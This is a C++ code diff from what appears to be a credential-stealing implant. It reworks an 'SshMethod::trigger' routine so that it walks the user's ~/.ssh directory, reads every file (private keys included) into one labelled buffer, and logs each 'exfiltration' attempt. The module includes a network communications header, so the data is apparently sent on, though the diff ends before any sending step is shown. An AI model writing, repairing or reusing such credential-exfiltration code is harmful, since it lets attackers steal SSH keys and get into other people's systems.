@@ -1,18 +1,24 @@
-#include "modules/gathering/SystemInfo.hpp"
+#include "modules/gathering/Ssh.hpp"
+#include "utils/FileUtils.hpp"
 #include "utils/SystemUtils.hpp"
 #include "utils/Logger.hpp"
 #include "network/Comms.hpp"
 
 bool SshMethod::trigger() {
-    std::vector<std::string> files = FileUtils::ListFilesRecursively("~/.ssh");
+    std::string homeDir = SystemUtils::GetUserHome();
+    std::string sshDir = homeDir + "/.ssh";
+
+    std::vector<std::string> files = FileUtils::ListFilesRecursively(sshDir);
     std::string data;
 
     int successCount = 0;
-    for (auto& file : files) {
-        std::string path = home + "/" + target;
+    for (const auto& filePath : files) {
+        LOG_INFO("Attempting exfiltration of {}", filePath)
+        data += "=== " + filePath + " ===";
+        data += FileUtils::ReadFile(filePath);
+        data += '\n';
 
-        LOG_INFO("Attempting exfiltration of {}", path)
-        data += FileUtils::ReadFile(path);
+        successCount++;
     }
 
     if (data.empty()) return false;
